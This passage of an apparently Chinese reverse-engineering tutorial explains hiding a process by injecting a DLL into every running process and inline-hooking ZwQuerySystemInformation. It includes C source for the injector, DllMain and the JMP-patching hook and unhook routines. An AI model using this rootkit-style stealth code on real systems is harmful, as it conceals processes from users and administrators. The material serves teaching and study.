&#x3D;进程查看器<br>taskmgr.exe &#x3D;任务管理器</p></blockquote><p>使用上述方法后，test.exe就对ProxExp.exe （或者taskmgr.exe）进程隐藏了。但是，这种方法存在以下两个问题。</p><p><strong>问题一：要钩取的进程个数</strong></p><p>检索进程的实用工具真的只有上面2种吗？不是的，除了上面提到的ProxExp.exe与taskmgr.exe）之外，还有众多其他的进程检索实用工具，甚至包含许多用户自己编写的进程查看工具。要想把某个进程隐藏起来，需要钩取系统中运行的所有进程。</p><p><strong>问题二：新创建的进程</strong></p><p>如果用户再运行一个ProcExp.exe （或者taskmgr.exe）会怎么样呢？由于第一个ProcExp.exe 进程已经被钩取了，所以它查找不到testexe进程。第二个ProcExp.exe进程由于尚未被钩取，所以仍然能正常查找到test.exe进程。</p><p><strong>解决方法：使用全局钩取</strong></p><p>为了解决以上2个问题，我们隐藏test.exe进程时需要钩取系统中运行的所有进程的ZwQuerySystemInformation() API，并且对后面将要启动运行的所有进程也做相同的钩取操作（当然操作是自动进行的）。这就是全局钩取的概念。由于需要在整个系统范围内进行钩取操作，所 以才用了 “全局”（Global）这个词。</p><blockquote><p>全局API钩取相关内容将在本章后半部分与下一章详细讲解。</p></blockquote><p>下面通过练习示例进一步理解、掌握通过修改API代码的方法钩取API的技术。</p><h1 id="33-4-练习-1-（HideProc-exe，stealth-dll）"><a href="#33-4-练习-1-（HideProc-exe，stealth-dll）" class="headerlink" title="33.4 练习 #1 （HideProc.exe，stealth.dll）"></a>33.4 练习 #1 （HideProc.exe，stealth.dll）</h1><p>HideProc.exe负责将stealth.dll文件注入所有运行中的进程。Stealth.dll负责钩取（注入stealth.dll 文件的）进程的ntdll.ZwQuerySystemInformation() API。接下来我们使用上面2个文件隐藏notepad.exe进程。</p><blockquote><p>上面两个练习文件不能用来解决“全局钩取-新进程”的问题。也就是说，运行HideProc.exe后，新建的进程不会自动钩取，因此这是一种<strong>不完全</strong>隐藏技术。本练习示例在Windows XP SP3 &amp; Windows 7 （32位）环境中通过测试。</p></blockquote><h2 id="33-4-1-运行-notepad-exe、procexp-exe、taskmgr-exe"><a href="#33-4-1-运行-notepad-exe、procexp-exe、taskmgr-exe" class="headerlink" title="33.4.1 运行 notepad.exe、procexp.exe、taskmgr.exe"></a>33.4.1 运行 notepad.exe、procexp.exe、taskmgr.exe</h2><p>首先分别运行notepad.exe （要隐藏的进程）、procexp.exe （钩取对象1）、taskmgr.exe进程（钩取对象2）。</p><h2 id="33-4-2-运行-HideProc-exe"><a href="#33-4-2-运行-HideProc-exe" class="headerlink" title="33.4.2 运行 HideProc.exe"></a>33.4.2 运行 HideProc.exe</h2><p>运行HideProc.exe,将stealth.dll文件注入当前运行的所有进程，如图33-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227194252629.png" alt="图33-4 运行HideProc.exe （隐藏）"></p><blockquote><p>后面的参数（dll path） 一定要使用绝对路径</p></blockquote><p>简要介绍一下HideProc.exe命令的几个参数： </p><p>□ -hide&#x2F;-show： -hide用于隐藏，-show用于取消隐藏。 </p><p>□ process name:要隐藏的进程名称。 </p><p>□ dll path：要注入的DLL文件路径。</p><h2 id="33-4-3-确认stealth-dll注入成功"><a href="#33-4-3-确认stealth-dll注入成功" class="headerlink" title="33.4.3 确认stealth.dll注入成功"></a>33.4.3 确认stealth.dll注入成功</h2><p>使用Process Explorer查看所有成功注入stealth.dll文件的进程，如图33-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227193210441.png" alt="图33-5 向所有运行中的进程注入stealth.dll文件"></p><blockquote><p>请注意，鉴于系统安全性的考虑，系统进程（PID0&amp;PID4）禁止进行注入操作。</p></blockquote><h2 id="33-4-4查看notepad-exe进程是否隐藏成功"><a href="#33-4-4查看notepad-exe进程是否隐藏成功" class="headerlink" title="33.4.4查看notepad.exe进程是否隐藏成功"></a>33.4.4查看notepad.exe进程是否隐藏成功</h2><p>在procexp.exe与taskmgr.exe中可以看到，原来存在的notepad.exe进程消失了（参考图33-6、 图33-7）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227193303541.png" alt="图33-6 procexp.exe中notepad.exe进程消失"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227193341313.png" alt="图33-7 task.exe中notpad.exe进程消失"></p><p>虽然notepad.exe进程的确在运行，但procexp.exe与taskmgr.exe中确实看不到notepad.exe进程，如图33-6与图33-7所示。</p><blockquote><p>由于仍然能看到记事本窗口，所以这种隐藏进程的方法并不算完美。但是请记得，我们的目标只是隐藏线程本身，可以暂时不管程序窗口。</p></blockquote><h2 id="33-4-5-取消notepad-exe进程隐藏"><a href="#33-4-5-取消notepad-exe进程隐藏" class="headerlink" title="33.4.5 取消notepad.exe进程隐藏"></a>33.4.5 取消notepad.exe进程隐藏</h2><p>以-show模式运行HideProc.exe命令，将stealth.dll文件从所有进程中卸载，如图33-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220227194443849.png" alt="图33-8 运行HideProc.exe （取消隐藏） "></p><p>在procexp.exe与taskmgr.exe中查看notepad.exe进程，可以看到它又正常显示。</p><blockquote><p>这里好像需要重启procexp才能看到正常显示的notepad</p></blockquote><h1 id="33-5-源代码分析"><a href="#33-5-源代码分析" class="headerlink" title="33.5 源代码分析"></a>33.5 源代码分析</h1><p>下面分析练习示例的源代码，进一步了解通过修改API代码来实现API钩取的技术原理。</p><blockquote><p>所有源代码均使用VC++2010 Express Edition工具开发而成，并在Widows XP SP3 &amp; Windows 7 （32位）系统环境中通过测试。</p></blockquote><h2 id="33-5-1-HideProc-cpp"><a href="#33-5-1-HideProc-cpp" class="headerlink" title="33.5.1 HideProc.cpp"></a>33.5.1 HideProc.cpp</h2><p>HideProc.exe程序负责向运行中的所有进程注入&#x2F;卸载指定DLL文件，它在原有InjectDll.exe程序基础上添加了向所有进程注入DLL的功能，可以认为是InjectDll.exe程序的加强版。</p><p><strong>lnjectAIIProcess()</strong></p><p>InjectAllProcess()是hideproc.exe程序的核心函数，它首先检索运行中的所有进程，然后分别将指定DLL注入各进程或从各进程卸载。下面分析InjectAllProcess()函数，源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">InjectAllProcess</span><span class="hljs-params">(<span class="hljs-type">int</span> nMode, LPCTSTR szDllPath)</span><br>&#123;<br>DWORD                   dwPID = <span class="hljs-number">0</span>;<br>HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;<br>PROCESSENTRY32          pe;<br><br><span class="hljs-comment">// 获取系统快照</span><br>pe.dwSize = <span class="hljs-keyword">sizeof</span>( PROCESSENTRY32 );<br>hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, <span class="hljs-literal">NULL</span> );<br><br><span class="hljs-comment">// 查找进程</span><br>Process32First(hSnapShot, &amp;pe);<br><span class="hljs-keyword">do</span><br>&#123;<br>dwPID = pe.th32ProcessID;<br><br>        <span class="hljs-comment">// 鉴于系统安全性的考虑，对PID小于100的进程不进行注入操作</span><br><span class="hljs-keyword">if</span>( dwPID &lt; <span class="hljs-number">100</span> )<br><span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span>( nMode == INJECTION_MODE )<br>    InjectDll(dwPID, szDllPath);<br>        <span class="hljs-keyword">else</span><br>            EjectDll(dwPID, szDllPath);<br>&#125;<br><span class="hljs-keyword">while</span>( Process32Next(hSnapShot, &amp;pe) );<br><br>CloseHandle(hSnapShot);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先使用CreateToolhelp32Snapshot() API获取系统中运行的所有进程的列表，然后使用Process32First()与Process32Next() API将获得的进程信息存放到PROCESSENTRY32结构体变量pe中，进而获取进程的PID。</p><p>以下是CreateToolhelp32Snapshot()、Process32First()、Process32Next() API的函数定义（出处：MSDN）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE <span class="hljs-title function_">CreateToolhelp32Snapshot</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in] DWORD dwFlags,</span><br><span class="hljs-params">  [in] DWORD th32ProcessID</span><br><span class="hljs-params">)</span>;<br><br>BOOL <span class="hljs-title function_">Process32First</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]      HANDLE           hSnapshot,</span><br><span class="hljs-params">  [in, out] LPPROCESSENTRY32 lppe</span><br><span class="hljs-params">)</span>;<br><br>BOOL <span class="hljs-title function_">Process32Next</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]  HANDLE           hSnapshot,</span><br><span class="hljs-params">  [out] LPPROCESSENTRY32 lppe</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><blockquote><p>请注意，只有先提升HideProc.exe进程的权限（特权），才能准确获取所有进程的列表。在 HideProc.cpp 中，main()函数中调用了 SetPrivilege()函数，而 SetPrivilege()函数内部又调用了 AdjustTokenPrivileges() API 为 HideProc.exe 提升权限。</p></blockquote><p>获取了进程的PID后，要根据所用的命令选项（-show&#x2F;-hide）来选择调用InjectDllO函数还是EjectDll()函数。还需要注意的一点是，某进程的PID小于100时，则忽略它，不进行操作。原因在于，系统进程的PID （PID&#x3D;0, 4,8,…） —般都小于100, 为保证系统安全性，不会对这些进程注入DLL文件（这些PID值来自对Windows XP&#x2F;Vista&#x2F;7 OS的分析使用经验，其他Windows版本中，系统进程的PID值可能不同）。</p><h2 id="33-5-2-stealth-cpp"><a href="#33-5-2-stealth-cpp" class="headerlink" title="33.5.2 stealth.cpp"></a>33.5.2 stealth.cpp</h2><p>实际的API钩取操作由Stealth.dll文件负责，下面分析其源代码（Stealth.cpp）。</p><p><strong>SetProcName()</strong></p><p>首先看导出函数SepProcName()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// global variable (in sharing memory)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/SECTION:.SHARE,RWS&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;.SHARE&quot;</span>)</span><br>    TCHAR g_szProcName[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>__declspec(dllexport) <span class="hljs-type">void</span> <span class="hljs-title function_">SetProcName</span><span class="hljs-params">(LPCTSTR szProcName)</span><br>&#123;<br>    _tcscpy_s(g_szProcName, szProcName);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>以上代码先创建名为“.SHARE”的共享内存节区，然后创缓冲区，最后再由导出函数SetProcName()将要隐藏的进程名称保存到（SetProcName()函数在HideProc.exe中被调用执行）。</p><blockquote><p>在共享内存节区创建g_szProcName缓冲区的好处在于，stealth.dll被注入所有进程时，可以彼此共享隐藏进程的名称（随着程序不断改进，甚至也可以做到动态修改隐藏进程）。</p></blockquote><p><strong>DIIMain()</strong></p><p>下面看DllMain()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    <span class="hljs-type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    <span class="hljs-type">char</span>            *p = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// #1. 异常处理</span><br>    <span class="hljs-comment">// 若当前进程为HideProc.exe，则终止，不进行钩取操作。</span><br>    GetModuleFileNameA(<span class="hljs-literal">NULL</span>, szCurProc, MAX_PATH);<br>    p = <span class="hljs-built_in">strrchr</span>(szCurProc, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>    <span class="hljs-keyword">if</span>( (p != <span class="hljs-literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HideProc.exe&quot;</span>) )<br>        <span class="hljs-keyword">return</span> TRUE;<br><br>    <span class="hljs-keyword">switch</span>( fdwReason )<br>    &#123;<br>        <span class="hljs-comment">// #2. API Hooking</span><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, <br>                     (PROC)NewZwQuerySystemInformation, g_pOrgBytes);<br>        <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">// #3. API Unhooking </span><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH :<br>        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, <br>                       g_pOrgBytes);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上所见，DllMain()函数的代码非常简单。首先比较字符串，若进程名为“HideProc.exe”，则进行异常处理，不钩取API。发生DLL_PROCESS_ATTACH事件时，调用hook_by_code()函数钩取API；发生DLL_PROCESS_DETACH事件时，调用unhook_by_code()函数取消API钩取。</p><p>hook_ by_code()<br>该hook_by_code()函数通过修改代码实现API钩取操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">hook_by_code</span><span class="hljs-params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span><br>&#123;<br>    FARPROC pfnOrg;<br>    DWORD dwOldProtect, dwAddress;<br>    BYTE pBuf[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0xE9</span>, <span class="hljs-number">0</span>, &#125;;<br>    PBYTE pByte;<br><br>    <span class="hljs-comment">// 获取要钩取的API地址</span><br>    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);<br>    pByte = (PBYTE)pfnOrg;<br><br>    <span class="hljs-comment">// 若已经被钩取，返回FALSE</span><br>    <span class="hljs-keyword">if</span>( pByte[<span class="hljs-number">0</span>] == <span class="hljs-number">0xE9</span> )<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    <span class="hljs-comment">// 为了修改5个字节，先向内存添加“写”属性</span><br>    VirtualProtect((LPVOID)pfnOrg, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br><br>    <span class="hljs-comment">// 备份原有代码（5字节） </span><br>    <span class="hljs-built_in">memcpy</span>(pOrgBytes, pfnOrg, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// 计算JMP地址（E9 XXXXXXXX）</span><br>    <span class="hljs-comment">// =&gt; XXXX = pfnNew - pfnOrg - 5</span><br>    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">memcpy</span>(&amp;pBuf[<span class="hljs-number">1</span>], &amp;dwAddress, <span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">// “钩子”：修改5个字节（JMP XXXXXXXX）</span><br>    <span class="hljs-built_in">memcpy</span>(pfnOrg, pBuf, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// 恢复内存属性</span><br>    VirtualProtect((LPVOID)pfnOrg, <span class="hljs-number">5</span>, dwOldProtect, &amp;dwOldProtect);<br>    <br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>hook_by_code()函数参数介绍如下：</p><p>LPCTSTR szDllName： [IN]包含要钩取的API的DLL文件名称。<br>LPCTSTR szFuncName： [IN]要钩取的API名称。<br>PROC pfnNew： [IN]用户提供的钩取函数地址。<br>PBYTE pOrgBytes： [OUT]存储原来5个字节的缓冲区-后面“脱钩”时使用。</p><p>正如在工作原理中提到的一样，hook_by_code()函数用于将原来API代码的前5个字节更改为“JMP XXXXXXXX”指令。函数源代码比较简单，结合代码注释很容易理解，中间跳转地址的换算部分是代码逆向分析中相当重要的内容，下面仔细看看。根据Intel x86 （IA-32）指令格式，JMP指令对应的操作码为E9，后面跟着4个字节的地址。<br>也就是说，JMP指令的Instruction实际形式为“E9 XXXXXXXX”。需要注意的是，XXXXXXXX 地址值不是要跳转的绝对地址值，而是从当前JMP命令到跳转位置的相对距离。通过下述关系式可求得XXXXXXXX地址值。</p><p>XXXXXXXX&#x3D;要跳转的地址-当前指令地址-当前指令长度（5）</p><p>最后又减去5个字节是因为JMP指令本身长度就是5个字节。例如，当前JMP指令的地址为402000,若想跳转到401000地址处，写成“E9 00104000” 是不对的，XXXXXXXX地址值要使用上面的等式换算才行。</p><p>XXXXXXXX&#x3D;401000-402000-5&#x3D;FFFFEFFB</p><p>所以JMP指令的Instruction应为“E9FFFFEFFB”，通过OllyDbg的汇编或编辑功能可以确认这一点，如图33-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220304125656518.png" alt="图33-9 OllyDbg的汇编功能"></p><blockquote><p>除了 JMP指令外，还有一种short JMP命令，顾名思义，它是用来进行短距离跳转的指令，对应的IA-32指令为“EBXX”（指令长度为2字节）。希望各位在OllyDbg 中自己测试一下EB指令</p></blockquote><p>像上面这样每次使用JMP指令都要计算相对地址，显得不太方便。当然，也可以 使用其他指令直接用绝对地址跳转，但是这样的指令长度往往较为复杂。 </p><blockquote><p>例（1） PUSH+RET<br>68 00104000  PUSH 00401000<br>C3RETN<br>例（2） MOV+JMP<br>B8 00104000 MOV EAX, 00401000<br>FFE0 JMP EAX</p></blockquote><blockquote><p>计算32位地址时，使用Windows的计算器显得有些不方便。推荐大家试试32位 的Calculator v1.7 by cybult,它是一款实用性超强的计算器。</p></blockquote><blockquote><p>关于解析Op代码映射的方法请参考第49章。</p></blockquote><p>实际的ZwQuerySystemInformation() API钩取操作由hook_by_code()函数完成，下面使用OllyDbg对ZwQuerySystemInformation() API钩取前&#x2F;后进行调试，进一步了解钩取技术原理（相应进程为procexp.exe）。</p><p><strong>钩取之前</strong><br>首先看看钩取前的ZwQuerySystemInformation() API代码。ZwQuerySystemInformation()的地址为77F06238，指令代码如图33-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305194553363.png" alt="图33-10 钩取前的ZwQuerySystemInfomiation()代码"></p><p><strong>钩取之后</strong></p><p>注入stealth.dll文件，由hook_by_code()函数钩取API后，代码如图33-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305194734571.png" alt="图33-11 钩取后的ZwQuerySystemInformation()代码"></p><p>ZwQuerySystemInformation()函数起始代码做了如下更改（前5个字节）：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">77</span>F06238E9 C3AE698B     <span class="hljs-keyword">jmp</span> stealth.NewZwQuerySystemInformation<br></code></pre></td></tr></table></figure><p>地址 35A1100就是钩取数stealth.NewZwQuerySystemInformation()的地址。并且E9后面的4个 字节（8B69AEC3）就是使用前面的公式计算得到的（希望各位自己算一算）。</p><blockquote><p>示例环境中，Stealth.dll加载到ProcExp.exe进程的350000地址。</p></blockquote><p><strong>unhook_by_code()</strong><br>unhook_by_code()函数是用来取消钩取的函数，如代码33-5所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">unhook_by_code</span><span class="hljs-params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span><br>&#123;<br>    FARPROC pFunc;<br>    DWORD dwOldProtect;<br>    PBYTE pByte;<br><br>    <span class="hljs-comment">// 获取API地址</span><br>    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);<br>    pByte = (PBYTE)pFunc;<br><br>    <span class="hljs-comment">// 若已经“脱钩”，則返回FALSE</span><br>    <span class="hljs-keyword">if</span>( pByte[<span class="hljs-number">0</span>] != <span class="hljs-number">0xE9</span> )<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    <span class="hljs-comment">// 向内存添加”写”属性，为恢复原代码（5个字节）准备</span><br>    VirtualProtect((LPVOID)pFunc, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br><br>    <span class="hljs-comment">// Unhook</span><br>    <span class="hljs-built_in">memcpy</span>(pFunc, pOrgBytes, <span class="hljs-number">5</span>);<br><br>    <span class="hljs-comment">// 恢复内存属性</span><br>    VirtualProtect((LPVOID)pFunc, <span class="hljs-number">5</span>, dwOldProtect, &amp;dwOldProtect);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实，“脱钩”的工作原理非常简单，就是将函数代码开始的前5个字节恢复原值（代码很简单，请参考注释理解）。</p><p><strong>NewZwQuerySystemlnformation()</strong></p><p>最后，分析钩取函数NewZwQuerySystemInformation()。在此之前，先看看ntdll.ZwQuerySysteminformation() API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS WINAPI <span class="hljs-title function_">ZwQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="hljs-params">  _Inout_   PVOID                    SystemInformation,</span><br><span class="hljs-params">  _In_      ULONG                    SystemInformationLength,</span><br><span class="hljs-params">  _Out_opt_ PULONG                   ReturnLength</span><br><span class="hljs-params">)</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span><br>    ULONG NextEntryOffset;<br>    ULONG NumberOfThreads;<br>    BYTE Reserved1[<span class="hljs-number">48</span>];<br>    UNICODE_STRING ImageName;<br>    KPRIORITY BasePriority;<br>    HANDLE UniqueProcessId;<br>    PVOID Reserved2;<br>    ULONG HandleCount;<br>    ULONG SessionId;<br>    PVOID Reserved3;<br>    SIZE_T PeakVirtualSize;<br>    SIZE_T VirtualSize;<br>    ULONG Reserved4;<br>    SIZE_T PeakWorkingSetSize;<br>    SIZE_T WorkingSetSize;<br>    PVOID Reserved5;<br>    SIZE_T QuotaPagedPoolUsage;<br>    PVOID Reserved6;<br>    SIZE_T QuotaNonPagedPoolUsage;<br>    SIZE_T PagefileUsage;<br>    SIZE_T PeakPagefileUsage;<br>    SIZE_T PrivatePageCount;<br>    LARGE_INTEGER Reserved7[<span class="hljs-number">6</span>];<br>&#125; SYSTEM_PROCESS_INFORMATION;<br></code></pre></td></tr></table></figure><p>简单讲解：将 SystemlnformationClass 参数设置为 SystemProcessInformation（即5）后调用<br>ZwQuerySystemInformation() API，Systemlnformation [in&#x2F;out]参数中存储的是SYSTEM_PROCESS_INFORMATION结构体单向链表（single linked list）的起始地址。该结构体链表中存储着运行中的所有进程的信息。所以，隐藏某进程前，先要查找与之对应的链表成员，然后断开其与链表的链接。接下来看看NewZwQuerySystemInformation()函数的代码，了解具体实现方式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 